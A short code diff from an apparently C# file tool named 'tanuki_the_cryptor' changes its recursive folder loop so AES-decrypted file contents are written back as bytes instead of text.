@@ -84,8 +84,8 @@ namespace tanuki_the_cryptor
             foreach (string file in files)
             {
                 byte[] content = File.ReadAllBytes(file);
-                string plainText = Cryptography.AESDecrypt(content, key, iv);
-                File.WriteAllText(file, plainText);
+                byte[] plainText = Cryptography.AESDecrypt(content, key, iv);
+                File.WriteAllBytes(file, plainText);
             }
 
             string[] folders = Directory.GetDirectories(sourceFolder);
